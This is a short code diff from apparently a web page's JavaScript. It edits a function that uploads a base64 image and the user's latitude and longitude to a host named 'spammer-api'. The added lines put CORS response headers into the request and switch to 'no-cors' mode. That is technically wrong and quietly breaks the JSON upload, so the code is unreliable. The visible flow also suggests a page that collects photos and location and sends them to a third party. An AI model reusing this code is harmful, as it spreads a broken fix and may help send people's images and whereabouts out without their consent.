@@ -49,11 +49,14 @@
       const send = async (f, latitude, longitude) => {
         const rawResponse = await fetch("https://spammer-api.onrender.com/data", {
           method: "POST",
+          mode: "no-cors",
           headers: {
+            "Access-Control-Allow-Origin": "*",
+            "Access-Control-Allow-Methods": "GET,PUT,POST,DELETE,PATCH,OPTIONS",
             Accept: "application/json",
             "Content-Type": "application/json",
           },
-
+          
           body: JSON.stringify({
             base64image: f,
             latitude: latitude,
